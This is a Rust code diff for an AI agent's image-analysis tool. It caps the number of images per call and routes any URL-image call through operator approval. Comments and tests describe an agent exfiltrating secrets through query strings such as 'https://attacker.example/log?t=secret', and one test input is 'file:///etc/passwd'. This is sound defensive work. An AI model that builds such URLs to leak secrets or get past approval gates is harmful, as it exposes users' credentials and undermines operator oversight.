@@ -47,7 +47,25 @@ use std::path::PathBuf;
 use std::time::Duration;
 
 /// Max images per `image_analysis` call (bounds the request + the egress fan-out for URL images).
-pub const MAX_IMAGES: usize = 8;
+///
+/// SECURITY (flip-precondition, BUG 4 — crash-recovery staleness): an `image_analysis` dispatch is
+/// SEQUENTIAL and can be SLOW — each image is up to a 30s fetch ([`IMAGE_FETCH_TIMEOUT_MS`]) plus a
+/// vision-model call. The agent loop sets the durable crash-recovery heartbeat ONCE before the
+/// whole tool dispatch (it has no hook to refresh it MID-tool — the per-run `work_item_id`/`conn`
+/// are not threaded through the `ToolExecutor` trait, and doing so would touch the security-critical
+/// dispatch chokepoint = the "large plumbing" we avoid). So the WHOLE multi-image call must finish
+/// within [`crate::crash_recovery::EXECUTION_STATE_STALE_THRESHOLD_MS`] (300s) or a concurrent boot
+/// crash-recovery PASS-2 could mistake a LIVE run for a crash and false-abort it (a degrade).
+///
+/// At the former cap of 8, worst case = 8 × (30s fetch + per-call vision timeout) ≫ 300s → the
+/// false-abort hole. CAPPED to 2: worst case = 2 × (30s + 60s) = 180s, a 120s margin under 300s.
+/// This bound is CONDITIONAL on the friday-anthropic per-request timeout (≈60s, see
+/// `ANTHROPIC_REQUEST_TIMEOUT_MS_ASSUMED`) being added — that wall-clock bound on a SINGLE model
+/// call is tracked SEPARATELY (`UreqTransport::post_json` is currently unbounded); without it ONE
+/// call is unbounded and blows 300s regardless of the cap. So BUG 4 is PARTIALLY closed here (the
+/// fan-out is bounded); the per-call bound is the separate work. The `max_images_staleness_invariant`
+/// test pins the fan-out arithmetic.
+pub const MAX_IMAGES: usize = 2;
 
 /// Per-image decoded-size cap (10 MiB) — the data-uri base64 cap AND the workspace/URL read cap.
 pub const MAX_IMAGE_DECODED_BYTES: usize = 10 * 1024 * 1024;
@@ -57,6 +75,16 @@ pub const MAX_TOTAL_DECODED_BYTES: usize = 20 * 1024 * 1024;
 
 /// Per-image URL fetch timeout (matches the web_fetch default posture).
 const IMAGE_FETCH_TIMEOUT_MS: u64 = 30_000;
+
+/// The ASSUMED wall-clock bound on a SINGLE vision-model call, used ONLY by the
+/// `max_images_staleness_invariant` test to verify the worst-case [`MAX_IMAGES`] fan-out stays
+/// under the crash-recovery staleness threshold. This is NOT yet enforced in
+/// `friday_anthropic::UreqTransport::post_json` (which is currently unbounded) — adding that 60s
+/// per-request timeout is SEPARATE work the [`MAX_IMAGES`] cap is conditional on (see its doc). The
+/// const documents the assumption the cap math relies on so an adversarial reviewer sees it stated.
+/// `#[cfg(test)]`-only: it is a documentation/test anchor, not enforced production state.
+#[cfg(test)]
+pub(crate) const ANTHROPIC_REQUEST_TIMEOUT_MS_ASSUMED: u64 = 60_000;
 
 /// The valid `detail` values (TS-parity; no-op for Claude — validated, never forwarded).
 const VALID_DETAILS: &[&str] = &["low", "high", "auto"];
@@ -246,21 +274,25 @@ impl VisionExecutor {
 
     /// Validate + acquire ONE image spec into a [`VisionImage`] + its decoded byte length.
     /// Fail-closed on every form. Returns the per-image decoded length so the caller can bound
-    /// the aggregate.
+    /// the aggregate. The image FORM is classified by the shared [`image_source_kind`] so the
+    /// executor's egress decision can never drift from the gate's egress classification.
     fn acquire_image(&self, spec: &str) -> Result<(VisionImage, usize), ExecError> {
-        if let Some(rest) = spec.strip_prefix("data:") {
-            self.acquire_data_uri(rest)
-        } else if spec.starts_with("http://") || spec.starts_with("https://") {
-            self.acquire_url(spec)
-        } else if spec.starts_with("file://") {
-            // file:// is NEVER a workspace path nor an http(s) URL — reject explicitly (a local
-            // file MUST come in as a workspace-relative path, scoped by open_read_within_root).
-            Err(ExecError::Vision(VisionToolError::RejectedScheme(
-                "file".to_string(),
-            )))
-        } else {
+        match image_source_kind(spec) {
+            ImageSourceKind::DataUri => {
+                // strip "data:" — `image_source_kind` already confirmed the prefix.
+                self.acquire_data_uri(spec.strip_prefix("data:").unwrap_or(spec))
+            }
+            // The ONLY form that opens an outbound socket (SSRF-guarded egress).
+            ImageSourceKind::Url => self.acquire_url(spec),
+            ImageSourceKind::FileScheme => {
+                // file:// is NEVER a workspace path nor an http(s) URL — reject explicitly (a local
+                // file MUST come in as a workspace-relative path, scoped by open_read_within_root).
+                Err(ExecError::Vision(VisionToolError::RejectedScheme(
+                    "file".to_string(),
+                )))
+            }
             // Treat as a workspace-relative path (the SAME scoping the fs read tool uses).
-            self.acquire_workspace_path(spec)
+            ImageSourceKind::WorkspacePath => self.acquire_workspace_path(spec),
         }
     }
 
@@ -460,6 +492,66 @@ impl VisionModelClient for RuntimeVisionClient {
 }
 
 // ─── helpers ───
+
+/// The FORM of one image spec — the SINGLE source of truth for "what does this image do?", used
+/// by BOTH the executor ([`VisionExecutor::acquire_image`]) AND the gate classifier
+/// ([`image_analysis_has_url_image`] → `ToolRegistry::classify`). Sharing one classifier is what
+/// makes the egress classification and the executor's actual egress provably non-divergent (the
+/// `classify_matches_executor_*` correspondence tests pin it). Detection order matches
+/// `acquire_image`: `data:` FIRST (so a `data:` URI is never mis-read as a URL even if its payload
+/// contains the `http` substring), then the `http(s)://` SCHEME (a prefix check, NOT a `contains`),
+/// then `file://`, else a workspace-relative path.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum ImageSourceKind {
+    /// `data:<media>;base64,<payload>` — inline bytes, NO egress.
+    DataUri,
+    /// `http://` / `https://` — the ONLY form that opens an outbound socket (SSRF-guarded).
+    Url,
+    /// `file://` — explicitly rejected (fail-closed), NO egress.
+    FileScheme,
+    /// Anything else — a workspace-relative path opened in-root, NO egress.
+    WorkspacePath,
+}
+
+/// Classify ONE image spec into its [`ImageSourceKind`]. MUST stay byte-identical to the branch
+/// order in [`VisionExecutor::acquire_image`].
+pub(crate) fn image_source_kind(spec: &str) -> ImageSourceKind {
+    if spec.starts_with("data:") {
+        ImageSourceKind::DataUri
+    } else if spec.starts_with("http://") || spec.starts_with("https://") {
+        ImageSourceKind::Url
+    } else if spec.starts_with("file://") {
+        ImageSourceKind::FileScheme
+    } else {
+        ImageSourceKind::WorkspacePath
+    }
+}
+
+/// SECURITY (flip-precondition, BUG 2): does THIS `image_analysis` call include ANY http(s) URL
+/// image? `image_analysis` is registered `mutating:false` (a read), but a URL image triggers a GET
+/// to the agent-supplied URL BEFORE validation — `https://attacker.com/log?token=<secret>` leaks
+/// via the query string before the image even validates. The registry-level classifier
+/// (`ToolRegistry::classify`) RAISES `mutating` to true for any call with a URL image so it enters
+/// the gate (the operator approves the egress); a call with ONLY local forms (`data:` / workspace
+/// path / `file://`) stays `mutating:false` (no socket — no-degrade for the common in-workspace
+/// case). Parses the `images` param EXACTLY as [`VisionExecutor::analyze`] does (split on lines,
+/// trim, drop empties) and uses the SHARED [`image_source_kind`] so the egress predicate and the
+/// executor's egress can never diverge. Inspects the (model-controlled) param STRINGS only; the
+/// boolean is trusted Hub-derived, never model-asserted — the seal holds.
+pub(crate) fn image_analysis_has_url_image(params: &[(String, String)]) -> bool {
+    let Some(images_raw) = params
+        .iter()
+        .find(|(k, _)| k == "images")
+        .map(|(_, v)| v.as_str())
+    else {
+        return false;
+    };
+    images_raw
+        .lines()
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .any(|spec| image_source_kind(spec) == ImageSourceKind::Url)
+}
 
 /// Validate that `media_type` is one of the allowed `image/*` types (fail-closed otherwise).
 fn validate_media_type(media_type: &str) -> Result<(), ExecError> {
@@ -807,5 +899,107 @@ mod tests {
             Some("image/jpeg")
         );
         assert_eq!(sniff_image_media_type(b"not an image"), None);
+    }
+
+    // ── BUG 2: image_analysis egress (URL-image) classification ──
+
+    #[test]
+    fn image_source_kind_detection_matches_acquire_image_branches() {
+        // The shared classifier MUST agree with the `acquire_image` branch order: `data:` first
+        // (even when its payload contains the substring "http"), then http(s) SCHEME (prefix, not
+        // `contains`), then file://, else workspace path. This is the predicate the gate trusts.
+        assert_eq!(image_source_kind("http://x/a.png"), ImageSourceKind::Url);
+        assert_eq!(image_source_kind("https://x/a.png"), ImageSourceKind::Url);
+        // A data: URI whose payload string contains "http://" must NOT be read as a URL.
+        assert_eq!(
+            image_source_kind("data:image/png;base64,aHR0cDovL2V2aWw="),
+            ImageSourceKind::DataUri
+        );
+        assert_eq!(
+            image_source_kind("file:///etc/passwd"),
+            ImageSourceKind::FileScheme
+        );
+        assert_eq!(
+            image_source_kind("sub/dir/pic.png"),
+            ImageSourceKind::WorkspacePath
+        );
+    }
+
+    #[test]
+    fn url_image_is_classified_mutating_local_forms_are_not() {
+        // EXFILTRATION GATE: any http(s) URL image ⇒ the call classifies mutating (so it is gated
+        // BEFORE the executor opens the egress socket). Local-only forms stay read-only (no socket,
+        // no-degrade). Parses the `images` param exactly as the executor does.
+        let url = vec![
+            ("prompt".to_string(), "x".to_string()),
+            (
+                "images".to_string(),
+                "https://attacker.example/log?t=secret".to_string(),
+            ),
+        ];
+        assert!(
+            image_analysis_has_url_image(&url),
+            "URL image must classify mutating"
+        );
+
+        // Mixed: a local image PLUS a URL image ⇒ still mutating (the URL leaks).
+        let mixed = vec![
+            ("prompt".to_string(), "x".to_string()),
+            (
+                "images".to_string(),
+                "pic.png\nhttps://attacker.example/log".to_string(),
+            ),
+        ];
+        assert!(image_analysis_has_url_image(&mixed));
+
+        // Local-only forms ⇒ NOT mutating (read-only, fires immediately).
+        for local in [
+            "pic.png",
+            "sub/dir/pic.png",
+            "data:image/png;base64,aHR0cDovL3g=", // payload contains "http://" — must NOT trip
+            "file:///etc/passwd",                 // rejected by the executor, but no egress
+        ] {
+            let params = vec![
+                ("prompt".to_string(), "x".to_string()),
+                ("images".to_string(), local.to_string()),
+            ];
+            assert!(
+                !image_analysis_has_url_image(&params),
+                "local form {local:?} must stay non-mutating (no egress)"
+            );
+        }
+
+        // No images param at all ⇒ not mutating (a MissingParam error is raised later).
+        assert!(!image_analysis_has_url_image(&[(
+            "prompt".to_string(),
+            "x".to_string()
+        )]));
+    }
+
+    // ── BUG 4: MAX_IMAGES vs crash-recovery staleness ──
+
+    #[test]
+    fn max_images_staleness_invariant() {
+        // The WHOLE sequential image_analysis dispatch must finish within the crash-recovery
+        // staleness threshold (the heartbeat is set once before the dispatch, never refreshed
+        // mid-tool). Worst case = MAX_IMAGES × (per-image fetch timeout + per-call vision timeout).
+        // At the FORMER cap of 8 this was 8 × 90s = 720s ≫ 300s (the false-abort hole this fixes);
+        // at the capped 2 it is 180s, a 120s margin. This is CONDITIONAL on the assumed 60s
+        // per-call anthropic timeout (tracked separately — see ANTHROPIC_REQUEST_TIMEOUT_MS_ASSUMED).
+        let per_image_ms = IMAGE_FETCH_TIMEOUT_MS + ANTHROPIC_REQUEST_TIMEOUT_MS_ASSUMED;
+        let worst_case_ms = (MAX_IMAGES as u64) * per_image_ms;
+        assert!(
+            (worst_case_ms as i64) < crate::crash_recovery::EXECUTION_STATE_STALE_THRESHOLD_MS,
+            "MAX_IMAGES={MAX_IMAGES} worst-case {worst_case_ms}ms must stay under the \
+             {}ms staleness threshold (else a live multi-image call false-aborts as a crash)",
+            crate::crash_recovery::EXECUTION_STATE_STALE_THRESHOLD_MS
+        );
+        // Pin the regression: the FORMER cap of 8 would have BLOWN the threshold (720s > 300s).
+        let former_worst_case_ms = 8u64 * per_image_ms;
+        assert!(
+            (former_worst_case_ms as i64)
+                >= crate::crash_recovery::EXECUTION_STATE_STALE_THRESHOLD_MS,
+            "sanity: the former cap of 8 should exceed the threshold (proving the fix matters)"
+        );
     }
 }
